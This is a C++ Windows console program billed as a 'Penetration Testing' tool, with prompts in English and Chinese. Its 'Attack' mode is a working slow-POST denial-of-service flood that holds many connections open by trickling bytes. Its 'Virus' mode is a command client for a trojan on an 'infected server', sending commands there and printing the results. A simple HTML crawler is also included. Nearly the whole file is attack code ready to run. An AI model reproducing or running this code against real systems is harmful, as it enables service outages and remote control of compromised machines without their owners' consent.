#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <vector>
#include <string>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

std::vector<SOCKET> socks;

const int BUFFER_SIZE = 4096;

std::string getHTML(const std::string& url) {
    std::size_t pos = url.find("//");
    if (pos == std::string::npos) return "";
    pos += 2;
    std::size_t pathPos = url.find("/", pos);
    std::string host = url.substr(pos, pathPos - pos);
    std::string path = pathPos!= std::string::npos? url.substr(pathPos) : "/";
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result!= 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return "";
    }
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Error creating socket: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return "";
    }

    addrinfo hints = {};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    addrinfo* resultAddrInfo;
    if (getaddrinfo(host.c_str(), "80", &hints, &resultAddrInfo)!= 0) {
        std::cerr << "getaddrinfo failed: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return "";
    }

    if (connect(sock, resultAddrInfo->ai_addr, (int)resultAddrInfo->ai_addrlen) == SOCKET_ERROR) {
        std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
        freeaddrinfo(resultAddrInfo);
        closesocket(sock);
        WSACleanup();
        return "";
    }

    freeaddrinfo(resultAddrInfo);

    std::string request = "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n";
    if (send(sock, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
        std::cerr << "Error sending request: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return "";
    }

    char buffer[BUFFER_SIZE];
    std::string htmlContent;
    bool inHtmlContent = false;
    int bytesRead;
    while ((bytesRead = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[bytesRead] = '\0';
        std::string receivedData(buffer);
        if (!inHtmlContent) {
            std::size_t contentStart = receivedData.find("\r\n\r\n");
            if (contentStart!= std::string::npos) {
                inHtmlContent = true;
                receivedData = receivedData.substr(contentStart + 4);
            }
        }
        if (inHtmlContent) {
            htmlContent += receivedData;
        }
    }

    closesocket(sock);
    WSACleanup();

    return htmlContent;
}

std::string sendCommandAndReceive(const char* serverIp, int serverPort, const std::string& command) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData)!= 0) {
        return "WSAStartup failed.";
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return "Error creating socket.";
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    serverAddr.sin_addr.s_addr = inet_addr(serverIp);

    if (connect(sock, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return "Connection failed.";
    }

    send(sock, command.c_str(), command.length(), 0);
    char buffer[1024];
    int bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (bytesRead <= 0) {
        closesocket(sock);
        WSACleanup();
        return "Error receiving data.";
    }
    buffer[bytesRead] = '\0';
    std::string result(buffer);

    closesocket(sock);
    WSACleanup();
    return result;
}


void trojan_horse() {
    std::cout << R"( _____          _               _   _                     )" << std::endl;
    std::cout << R"(|_   _| __ ___ (_) __ _ _ __   | | | | ___  _ __ ___  ___ )" << std::endl;
    std::cout << R"(  | || '__/ _ \| |/ _` | '_ \  | |_| |/ _ \| '__/ __|/ _ \)" << std::endl;
    std::cout << R"(  | || | | (_) | | (_| | | | | |  _  | (_) | |  \__ \  __/)" << std::endl;
    std::cout << R"(  |_||_|  \___// |\__,_|_| |_| |_| |_|\___/|_|  |___/\___|)" << std::endl;
    std::cout << R"(              |__/ )" << std::endl;

    std::string serverIp;
    std::cout << "The ip of trojan horse被木马感染的服务器的IP地址: ";
    std::cin >> serverIp;

    int serverPort;
    std::cout << "The port of virus木马程序的端口: ";
    std::cin >> serverPort;

    while (true) {
        std::string command;
        std::cout << "Enter the command(enter 'exit' to exit)输入在目标终端要执行的命令(输入 'exit' 退出): ";
        std::cin >> command;
        if (command == "exit") {
            return;
        }
        std::string result = sendCommandAndReceive(serverIp.c_str(), serverPort, command);
        std::cout << "Return: " << result << std::endl;
    }

    return;
}
void conn_thread(int max_conn, int port, const std::string& host, const std::string& page) {
    for (int i = 0; i < max_conn; ++i) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);

        addrinfo hints = {};
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        addrinfo* result;
        if (getaddrinfo(host.c_str(), nullptr, &hints, &result) == 0) {
            serverAddr.sin_addr = reinterpret_cast<sockaddr_in*>(result->ai_addr)->sin_addr;
            freeaddrinfo(result);

            if (connect(s, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == 0) {
                std::string request = "POST " + page + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 10000000\r\nCookie: dklkt_dos_test\r\n\r\n";
                send(s, request.c_str(), request.length(), 0);
                std::cout << "[OK] Send buf OK成功发送buf!,conn=" << i << std::endl;
                socks.push_back(s);
            } else {
                std::cerr << "[NO] Can not connect or send error无法连接服务器或发送错误" << std::endl;
                Sleep(1000);
            }
        } else {
            std::cerr << "[NO] Ip error获取地址信息错误" << std::endl;
            Sleep(1000);
        }
    }
}

void send_thread() {
    while (true) {
        for (auto it = socks.begin(); it!= socks.end();) {
            SOCKET s = *it;
            if (send(s, "f", 1, 0) == SOCKET_ERROR) {
                std::cerr << "[NO] Send error发送异常" << std::endl;
                closesocket(s);
                it = socks.erase(it);
            } else {
                ++it;
            }
        }
        Sleep(1000);
    }
}

void dos() {
    int max_conn;
    int port;
    std::string host;
    std::string page;

    std::cout << "Enter the maximum number of connections输入最大连接数：";
    std::cin >> max_conn;
    std::cout << "Enter the port number输入端口号：";
    std::cin >> port;
    std::cout << "Enter the host name输入主机名：";
    std::cin >> host;
    std::cout << "Enter the page path输入页面路径：";
    std::cin >> page;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData)!= 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return;
    }

    std::thread connTh1(conn_thread, max_conn, port, host, page);
    std::thread sendTh1(send_thread);
    std::thread connTh2(conn_thread, max_conn, port, host, page);
    std::thread sendTh2(send_thread);

    connTh1.join();
    sendTh1.join();
    connTh2.join();
    sendTh2.join();

    WSACleanup();
    return;
}
void crawler() {
    std::string url;
    std::cout << "Enter the url输入网址:";
    std::cin >> url;
    std::string outfile;
    std::cout << "Enter the outfile输入输出文件:";
    std::cin >> outfile;
    std::string html = getHTML(url);
    if (!html.empty()) {
        std::ofstream outFile(outfile.c_str());
        outFile << html;
        outFile.close();
        std::cout << "HTML content saved to output.html" << std::endl;
    } else {
        std::cerr << "Failed to fetch HTML content." << std::endl;
    }

    return;
}
int main() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
    std::cout << "Penetration Testing渗透测试\nwriter:linhonghan作者：林泓翰\n";
    start:
	while(true) {
		std::string cmd;
		std::cout << ">";
		std::cin >> cmd;
		if(cmd == "exit") {
			return 0;
		}
        if(cmd == "\n") {
            goto start;
        }
		if(cmd == "Attack") {
			dos();
		}
        else if(cmd == "Virus") {
            trojan_horse();
        }
        else if(cmd == "Crawler") {
            crawler();
        }
        else{
            std::cout << "Error: '" << cmd << "' not the right command.错误：不正确的命令'" << cmd << "'" << "\n";
        }
	}
    return 0;
}
